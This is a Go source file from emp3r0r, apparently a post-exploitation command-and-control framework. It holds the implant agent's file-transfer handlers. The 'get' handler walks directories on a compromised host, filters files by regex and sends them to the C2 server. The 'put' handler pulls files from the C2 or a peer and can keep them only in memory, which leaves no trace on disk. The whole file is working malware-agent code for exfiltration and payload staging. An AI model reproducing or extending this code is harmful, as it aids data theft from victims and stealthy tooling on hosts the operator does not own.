package handler

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// getCmdRun downloads a file or lists directory files for download.
func getCmdRun(cmd *cobra.Command, args []string) {
	filePath, _ := cmd.Flags().GetString("file_path")
	filter, _ := cmd.Flags().GetString("filter")
	offset, _ := cmd.Flags().GetInt64("offset")
	token, _ := cmd.Flags().GetString("token")

	if filePath == "" || offset < 0 || token == "" {
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("args error: %v", args))
		return
	}
	// If directory, walk and list files.
	if util.IsDirExist(filePath) {
		var re *regexp.Regexp
		var err error
		if filter != "" {
			re, err = regexp.Compile(filter)
			if err != nil {
				c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("Invalid regex: %v", err))
				return
			}
		}
		fileList := []string{}
		err = filepath.Walk(filePath, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if !info.IsDir() {
				if re != nil && !re.MatchString(info.Name()) {
					return nil
				}
				fileList = append(fileList, path)
			}
			return nil
		})
		if err != nil || len(fileList) == 0 {
			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("Error: %v", err))
			return
		}
		c2transport.NotifyC2(cmd, "%s", strings.Join(fileList, "\n"))
		return
	}

	// Single file: send file via existing helper.
	err := c2transport.SendFile2CC(filePath, offset, token)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("Error: failed to send file %s: %v", filePath, err))
		return
	}
	c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("Success: %s has been sent", filePath))
}

// putCmdRun receives a file from CC and saves it locally.
func putCmdRun(cmd *cobra.Command, args []string) {
	fileName, _ := cmd.Flags().GetString("file")
	destPath, _ := cmd.Flags().GetString("path")
	size, _ := cmd.Flags().GetInt64("size")
	origChecksum, _ := cmd.Flags().GetString("checksum")
	downloadAddr, _ := cmd.Flags().GetString("addr")
	saveToMem, _ := cmd.Flags().GetBool("mem")

	if fileName == "" || destPath == "" || size == 0 {
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("args error: %v", args))
		return
	}

	// Memory storage handling
	if saveToMem {
		logging.Printf("putCmdRun: saving %s to memory", fileName)
		// Download data directly (path="" tells DownloadViaC2 to return []byte)
		// Note: We bypass c2transport.FetchFile which is disk-centric for now, or we modify FetchFile?
		// FetchFile uses DownloadViaC2 if addr is empty.
		// If addr is set (P2P), FetchFileKCP is used.
		// Let's supporting P2P + Mem later. For now, direct C2 download -> Mem.

		// However, the plan said: "Call c2transport.DownloadViaC2 with path=''"
		data, err := c2transport.DownloadViaC2(fileName, "", origChecksum)
		if err != nil {
			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to download to memory %s: %v", fileName, err))
			return
		}

		err = util.SaveFileAgent(destPath, data, 0600, util.StorageMemory)
		if err != nil {
			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to save to memory %s: %v", destPath, err))
			return
		}
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("%s uploaded to memory, sha256sum: %s", destPath, origChecksum))
		return
	}

	_, err := c2transport.FetchFile(downloadAddr, fileName, destPath, origChecksum)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to download %s: %v", fileName, err))
		return
	}
	// Calculate checksum from saved file (memory or disk)
	fileData, err := util.ReadFileAgent(destPath)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: checksum failed, cannot read %s: %v", destPath, err))
		return
	}
	checksum := crypto.SHA256SumRaw(fileData)

	downloadedSize := util.FileSize(destPath)
	resp := fmt.Sprintf("%s uploaded, sha256sum: %s", destPath, checksum)
	if downloadedSize < size {
		resp = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nRun `put` again to resume", downloadedSize, size, checksum)
	}
	c2transport.NotifyC2(cmd, "%s", resp)
}
